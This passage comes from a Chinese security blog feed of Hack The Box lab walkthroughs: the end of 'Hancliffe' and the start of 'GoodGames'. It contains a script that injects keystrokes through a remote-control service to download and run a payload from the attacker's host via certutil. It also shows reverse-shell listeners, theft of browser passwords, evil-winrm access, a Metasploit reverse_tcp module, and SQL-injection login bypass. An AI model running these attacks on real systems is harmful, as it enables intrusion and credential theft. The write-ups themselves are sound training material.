class="hljs-string">&quot;2d&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>:<span class="hljs-string">&quot;27&quot;</span>,<span class="hljs-string">&#x27;&quot;&#x27;</span>:<span class="hljs-string">&quot;22&quot;</span>,<span class="hljs-string">&quot;:&quot;</span>:<span class="hljs-string">&quot;3a&quot;</span>,<span class="hljs-string">&quot;;&quot;</span>:<span class="hljs-string">&quot;3b&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>:<span class="hljs-string">&quot;3f&quot;</span>,<span class="hljs-string">&quot;`&quot;</span>:<span class="hljs-string">&quot;60&quot;</span>,<span class="hljs-string">&quot;~&quot;</span>:<span class="hljs-string">&quot;7e&quot;</span>,<br><span class="hljs-string">&quot;\\&quot;</span>:<span class="hljs-string">&quot;5c&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>:<span class="hljs-string">&quot;7c&quot;</span>,<span class="hljs-string">&quot;&#123;&quot;</span>:<span class="hljs-string">&quot;7b&quot;</span>,<span class="hljs-string">&quot;&#125;&quot;</span>:<span class="hljs-string">&quot;7d&quot;</span>,<span class="hljs-string">&quot;,&quot;</span>:<span class="hljs-string">&quot;2c&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>:<span class="hljs-string">&quot;2e&quot;</span>&#125;<br><br><span class="hljs-comment"># User Specified arguments</span><br><span class="hljs-keyword">try</span>:<br>rhost = sys.argv[<span class="hljs-number">1</span>]<br>lhost = sys.argv[<span class="hljs-number">2</span>]<br>payload = sys.argv[<span class="hljs-number">3</span>]<br><span class="hljs-keyword">except</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python &quot;</span> + sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; &lt;target-ip&gt; &lt;local-http-ip&gt; &lt;payload-name&gt;&quot;</span>)<br><br><br><span class="hljs-comment"># Send Windows Key Input Twice</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SendWin</span>():<br>target.sendto(win_key,(rhost, port))<br>target.sendto(win_key,(rhost, port))<br>sleep(<span class="hljs-number">0.4</span>)<br><br><br><span class="hljs-comment"># Send Enter/Return Key Input</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SendReturn</span>():<br>target.sendto(ret_key,(rhost, port))<br>sleep(<span class="hljs-number">0.4</span>)<br><br><span class="hljs-comment"># Send String Characters</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SendString</span>(<span class="hljs-params">string, rhost</span>):<br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> string:<br><span class="hljs-keyword">if</span> char == <span class="hljs-string">&quot; &quot;</span>:<br>target.sendto(space_key,(rhost, port))<br>sleep(<span class="hljs-number">0.02</span>)<br><span class="hljs-keyword">else</span>:<br>convert = characters[char].decode(<span class="hljs-string">&quot;hex&quot;</span>)<br>target.sendto(one + convert + two + convert + three,(rhost, port))<br>sleep(<span class="hljs-number">0.02</span>)<br><br><span class="hljs-comment"># Main Execution</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>target.connect((rhost,port))<br>sleep(<span class="hljs-number">0.5</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Connecting to target...&quot;</span>)<br>target.sendto(<span class="hljs-built_in">open</span>,(rhost,port)) <span class="hljs-comment"># Initialize Connection to Unified</span><br>sleep(<span class="hljs-number">0.02</span>)<br>target.sendto(open_fin,(rhost,port)) <span class="hljs-comment"># Finish Initializing Connection</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Popping Start Menu&quot;</span>)<br>sleep(<span class="hljs-number">0.02</span>)<br>SendWin()<br>sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Opening CMD&quot;</span>)<br>SendString(<span class="hljs-string">&quot;cmd.exe&quot;</span>, rhost)<br>sleep(<span class="hljs-number">0.3</span>)<br>SendReturn()<br>sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] *Super Fast Hacker Typing*&quot;</span>)<br>SendString(<span class="hljs-string">&quot;certutil.exe -f -urlcache http://&quot;</span> + lhost + <span class="hljs-string">&quot;/&quot;</span> + payload + <span class="hljs-string">&quot; C:\\programdata\\&quot;</span> + payload, rhost) <span class="hljs-comment"># Retrieve HTTP hosted payload</span><br>sleep(<span class="hljs-number">0.3</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Downloading Payload&quot;</span>)<br>SendReturn()<br>sleep(<span class="hljs-number">3</span>)<br>SendString(<span class="hljs-string">&quot;C:\\programdata\\&quot;</span> + payload, rhost) <span class="hljs-comment"># Execute Payload</span><br>sleep(<span class="hljs-number">0.3</span>)<br>SendReturn()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Done! Check listener?&quot;</span>)<br>target.close()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>main()  <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220523150225762.png" alt="image-20220523150225762"></p><p>无法getsystem，getsystem会话会被断掉。那它就失去了意义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; rlwrap -cAr nc -lnvp 443<br>listening on [any] 443 ...<br><br>                                                                                                                      <br>┌─(Mosaictheory)-[~/tmp]<br>└&gt;&gt; rlwrap -cAr nc -lnvp 1337<br>listening on [any] 1337 ...<br>connect to [10.10.16.4] from (UNKNOWN) [10.10.11.115] 60817<br>Microsoft Windows [Version 10.0.19043.1266]<br>(c) Microsoft Corporation. All rights reserved.<br><br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-string">&#x27;ls&#x27;</span> is not recognized as an internal or external <span class="hljs-built_in">command</span>,<br>operable program or batch file.<br><br><span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is B0F6-2F1B<br><br> Directory of C:\Users\clara<br><br>11/30/2021  10:54 AM    &lt;DIR&gt;          .<br>11/30/2021  10:54 AM    &lt;DIR&gt;          ..<br>10/16/2021  10:51 AM    &lt;DIR&gt;          .nxshell<br>06/12/2021  12:58 AM    &lt;DIR&gt;          3D Objects<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Contacts<br>10/11/2021  05:39 PM    &lt;DIR&gt;          Desktop<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Documents<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Downloads<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Favorites<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Links<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Music<br>07/17/2021  08:46 AM    &lt;DIR&gt;          OneDrive<br>06/12/2021  01:01 AM    &lt;DIR&gt;          Pictures<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Saved Games<br>06/12/2021  12:59 AM    &lt;DIR&gt;          Searches<br>06/12/2021  12:58 AM    &lt;DIR&gt;          Videos<br>               0 File(s)              0 bytes<br>              16 Dir(s)   5,695,025,152 bytes free<br><br><span class="hljs-built_in">cd</span> Desktop <br><span class="hljs-built_in">cd</span> Desktop <br><br><span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is B0F6-2F1B<br><br> Directory of C:\Users\clara\Desktop<br><br>10/11/2021  05:39 PM    &lt;DIR&gt;          .<br>10/11/2021  05:39 PM    &lt;DIR&gt;          ..<br>05/22/2022  09:29 PM                34 user.txt<br>               1 File(s)             34 bytes<br>               2 Dir(s)   5,695,021,056 bytes free<br><br><span class="hljs-built_in">type</span> user.txt <br><span class="hljs-built_in">type</span> user.txt <br>29................................<br><br>C:\Users\clara\Desktop&gt;<br></code></pre></td></tr></table></figure><p>curl传文件不行，会被不明力量强行中断，但是smb可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; smbserver.py s . -username <span class="hljs-built_in">whoami</span> -password <span class="hljs-built_in">whoami</span> -smb2support                          <br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.16.0-unknown is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>/usr/lib/python3/dist-packages/pkg_resources/__init__.py:116: PkgResourcesDeprecationWarning: 1.12.1-git20200711.33e2d80-dfsg1-0.6 is an invalid version and will not be supported <span class="hljs-keyword">in</span> a future release<br>  warnings.warn(<br>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Incoming connection (10.10.11.115,60855)<br>[*] AUTHENTICATE_MESSAGE (\<span class="hljs-built_in">whoami</span>,HANCLIFFE)<br>[*] User HANCLIFFE\<span class="hljs-built_in">whoami</span> authenticated successfully<br>[*] <span class="hljs-built_in">whoami</span>:::aaaaaaaaaaaaaaaa:b2caad1c73ea346d4af02e8f5ff7ddbc:010100000000000080764af9776ed801790b7702c50fe5530000000001001000760078004700500042007500550066000300100076007800470050004200750055006600020010004f007a0043006800430046006a005100040010004f007a0043006800430046006a0051000700080080764af9776ed80106000400020000000800300030000000000000000000000000200000b027d7c9be1ebbf386b41ca6eeace88a2d7a241fbebd7230c972072accdfd38d0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0034000000000000000000<br>[*] Connecting Share(1:IPC$)<br>[*] Connecting Share(2:s)<br>[*] Disconnecting Share(1:IPC$)<br>[*] Connecting Share(3:IPC$)<br>[*] Disconnecting Share(3:IPC$)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">net use \\10.10.16.4\s /u:<span class="hljs-built_in">whoami</span> <span class="hljs-built_in">whoami</span><br>net use \\10.10.16.4\s /u:<span class="hljs-built_in">whoami</span> <span class="hljs-built_in">whoami</span><br>The <span class="hljs-built_in">command</span> completed successfully.<br><br><br>copy \\10.10.16.4\s\hack-browser-data-windows-64bit.exe .<br>copy \\10.10.16.4\s\hack-browser-data-windows-64bit.exe .<br>        1 file(s) copied.<br><br><span class="hljs-built_in">dir</span><br><span class="hljs-built_in">dir</span><br> Volume <span class="hljs-keyword">in</span> drive C has no label.<br> Volume Serial Number is B0F6-2F1B<br><br> Directory of C:\ProgramData<br>.\hack-browser-data-windows-64bit.exe -b all -f json --<span class="hljs-built_in">dir</span> results -zip<br>.\hack-browser-data-windows-64bit.exe -b all -f json --<span class="hljs-built_in">dir</span> results -zip<br>[NOTICE] [main.go:68,func1] compress success  <br></code></pre></td></tr></table></figure><p>会多出两个文件及目录：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">05</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> AM            <span class="hljs-number">31</span>,<span class="hljs-number">031</span> chromiumKey<br><span class="hljs-attribute">05</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          results<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; <span class="hljs-built_in">cat</span> firefox_ljftf853_default_release_password.json <br>[<br>  &#123;<br>    <span class="hljs-string">&quot;UserName&quot;</span>: <span class="hljs-string">&quot;hancliffe.htb&quot;</span>,<br>    <span class="hljs-string">&quot;Password&quot;</span>: <span class="hljs-string">&quot;#@H@ncLiff3D3velopm3ntM@st3rK3y*!&quot;</span>,<br>    <span class="hljs-string">&quot;LoginUrl&quot;</span>: <span class="hljs-string">&quot;http://localhost:8000&quot;</span>,<br>    <span class="hljs-string">&quot;CreateDate&quot;</span>: <span class="hljs-string">&quot;2021-06-26T22:20:59-07:00&quot;</span><br>  &#125;<br>]<br></code></pre></td></tr></table></figure><p>我回到了8000端口，这密码是谁的我不知道。但它就这么点用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"> Directory of C:\Users<br><br>06/26/2021  10:35 PM    &lt;DIR&gt;          .<br>06/26/2021  10:35 PM    &lt;DIR&gt;          ..<br>11/30/2021  10:54 AM    &lt;DIR&gt;          Administrator<br>11/30/2021  10:54 AM    &lt;DIR&gt;          clara<br>06/26/2021  10:35 PM    &lt;DIR&gt;          development<br>06/03/2021  07:00 AM    &lt;DIR&gt;          Public<br>11/30/2021  10:54 AM    &lt;DIR&gt;          svc_account<br><br></code></pre></td></tr></table></figure><p>最后发现是 development 的：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AMl</span>.q2DHp?<span class="hljs-number">2</span>.C/V0kNFU<br></code></pre></td></tr></table></figure><p>无法直接冒充，我无法输入密码，当我进入输入密码会被自动跳出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">runas /netonly /user:development <span class="hljs-string">&quot;powershell.exe&quot;</span><br>runas /netonly /user:development <span class="hljs-string">&quot;powershell.exe&quot;</span><br>Enter the password <span class="hljs-keyword">for</span> development: <br><br><span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>hancliffe\clara<br><br>runas /netonly /user:hancliffe\development <span class="hljs-string">&quot;powershell.exe&quot;</span><br>runas /netonly /user:hancliffe\development <span class="hljs-string">&quot;powershell.exe&quot;</span><br>Enter the password <span class="hljs-keyword">for</span> hancliffe\development: <br><br>C:\Users&gt;<br></code></pre></td></tr></table></figure><p>目标是开着5985的，我猜是winrm：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br><br>Active Connections<br><br>  Proto  Local Address          Foreign Address        State           PID<br>  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       752<br>  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       916<br>  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4<br>  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       4896<br>  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       3224<br>  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4<br>  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       752<br>  TCP    0.0.0.0:9510           0.0.0.0:0              LISTENING       3468<br>  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       3468<br></code></pre></td></tr></table></figure><p>我可以转发出来再尝试链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; evil-winrm -i 127.0.0.1 -u development -p <span class="hljs-string">&#x27;AMl.q2DHp?2.C/V0kNFU&#x27;</span> <br><br>Evil-WinRM shell v3.3<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\development\Documents&gt; <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>在\DevApp会有一个exe以及PS1脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\DevApp&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\DevApp<br><br><br>Mode                 LastWriteTime         Length Name<br>----                 -------------         ------ ----<br>-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe<br>-a----         9/14/2021  10:57 AM            636 restart.ps1<br><br>*Evil-WinRM* PS C:\DevApp&gt; <span class="hljs-built_in">type</span> restart.ps1<br><span class="hljs-comment"># Restart app every 3 mins to avoid crashes</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>) &#123;<br>  <span class="hljs-comment"># Delete existing forwards</span><br>  cmd /c <span class="hljs-string">&quot;netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0&quot;</span><br>  <span class="hljs-comment"># Spawn app</span><br>  <span class="hljs-variable">$proc</span> = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList (<span class="hljs-string">&quot;C:\DevApp\MyFirstApp.exe&quot;</span>)<br>  <span class="hljs-built_in">sleep</span> 2<br>  <span class="hljs-comment"># Get random port</span><br>  <span class="hljs-variable">$port</span> = (Get-NetTCPConnection -OwningProcess <span class="hljs-variable">$proc</span>.ProcessId).LocalPort<br>  <span class="hljs-comment"># Forward port to 9999</span><br>  cmd /c <span class="hljs-string">&quot;netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=<span class="hljs-variable">$port</span> connectaddress=127.0.0.1&quot;</span><br>  <span class="hljs-built_in">sleep</span> 180<br>  <span class="hljs-comment"># Kill and repeat</span><br>  taskkill /f /t /im MyFirstApp.exe<br>&#125;<br></code></pre></td></tr></table></figure><p>这脚本每三分钟启动一次该程序。这台靶机没打完，后边提权需要逆向MyFirstApp.exe。</p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - GoodGames</title>
    <link href="/post/HackTheBox-GoodGames.html"/>
    <url>/post/HackTheBox-GoodGames.html</url>
    
    <content type="html"><![CDATA[<h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><p>因为网络环境的原因，用Nmap扫描全端口会很慢，所以我决定先用masscan确定目标端口开放情况，再使用Nmap对指定端口调用脚本进行扫描，或许会快很多：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo masscan -p1-65535,U:1-65535 10.10.11.130 --rate 2000 -e tun0<br>[sudo] mosaictheory 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-14 07:08:44 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 80/tcp on 10.10.11.130                                    <br>rate:  0.00-kpps, 100.00% <span class="hljs-keyword">done</span>, waiting -55-secs, found=1  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; sudo nmap -sC -sV -Pn 10.10.11.130 -p80            <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 15:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.130<br>Host is up (0.21s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.51<br>|_http-title: GoodGames | Community and Store<br>|_http-server-header: Werkzeug/2.0.2 Python/3.9.2<br>Service Info: Host: goodgames.htb<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.96 seconds<br><br></code></pre></td></tr></table></figure><p>可以先查询一下目标web信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; whatweb http://goodgames.htb<br>http://goodgames.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]<br></code></pre></td></tr></table></figure><p>可以先找一下相关漏洞：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit Werkzeug                  <br>------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                      |  Path<br>------------------------------------------------------------------------------------ ---------------------------------<br>Pallets Werkzeug 0.15.4 - Path Traversal                                            | python/webapps/50101.py<br>Werkzeug - <span class="hljs-string">&#x27;Debug Shell&#x27;</span> Command Execution                                          | multiple/remote/43905.py<br>Werkzeug - Debug Shell Command Execution (Metasploit)                               | python/remote/37814.rb<br>------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>看起来Metasploit集成有漏洞利用模块，可以先对其进行一次漏洞测试，但在查看参数配置时候发现一些不对劲：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(multi/http/werkzeug_debug_rce) &gt; show options <br><br>Module options (exploit/multi/http/werkzeug_debug_rce):<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   Proxies                     no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]<br>   RHOSTS     10.10.11.130     <span class="hljs-built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki<br>                                         /Using-Metasploit<br>   RPORT      80               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   TARGETURI  /console         <span class="hljs-built_in">yes</span>       URI to the console<br>   VHOST                       no        HTTP server virtual host<br><br><br>Payload options (python/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  10.10.16.4       <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br></code></pre></td></tr></table></figure><p>它需要一个URL进行代码执行，但是默认的&#x2F;console是不行的，看来还是需要我去web页面看一眼，页面还挺棒：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514153839603.png" alt="image-20220514153839603"  /><p>右上角有一个容易被人遗漏掉的人物图标，其实是一个登录按钮，而且是前端校验：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514154319919.png" alt="image-20220514154319919"  /><p>万能密码就能登录，看来这套题的意义不在这里，登录成功后会进入用户配置页面，根据目前它为我显示的信息，我现在可能是管理员：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155537779.png" alt="image-20220514155537779"  /><p>整个页面只有一个更改密码的文本框，还要一些推特分享按钮，但是同样的在右上角一个会被人遗漏的地方，有一个齿轮图标：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155651322.png" alt="image-20220514155651322"></p><p>点击它会获得一个新域名：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155717462.png" alt="image-20220514155717462"  /><p>或许我可以试着将IP地址写入到hosts文件中再试试，它可以，而我获取到了一个新的登录页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514155844929.png" alt="image-20220514155844929"  /><p>或许我的账号可以使用，但是我没有密码， 而万能密码在这里不起作用，或许在数据库中会有一些其他信息，而我刚刚只是简单的使用万能密码登录成功便没有了下文，或许我可以去查询一下数据库中会不会有什么信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220514160349717.png" alt="image-20220514160349717"  /><h4 id="SQL注入："><a href="#SQL注入：" class="headerlink" title="SQL注入："></a>SQL注入：</h4><p>可以把数据包保存下来通过SQLMAP去枚举，在数据库中有一串hash：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 